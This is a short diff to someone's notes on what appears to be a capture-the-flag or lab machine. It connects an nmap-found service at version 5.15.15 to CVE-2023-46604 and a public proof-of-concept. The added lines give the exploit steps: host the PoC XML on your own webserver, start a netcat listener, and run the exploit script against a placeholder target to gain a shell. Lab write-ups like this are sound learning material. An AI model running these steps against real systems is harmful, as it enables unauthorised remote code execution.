@@ -32,5 +32,7 @@ Nmap done: 1 IP address (1 host up) scanned in 9.47 seconds
 * I can see that the version is 5.15.15, so I decided to investigate potential vulnerabilities for this version
 	* https://nvd.nist.gov/vuln/detail/CVE-2023-46604
 * looked up CVE-2023-46604 poc and got https://github.com/evkl1d/CVE-2023-46604
-	* 
+	* The POC needs to be running on a webserver **you host** not on the website
+	* Also need a nc listener
+	* THEN you run the exploit command: `python exploit.py -i <target-ip> -p <target-port> -u <url-to-poc.xml>`
 # Root
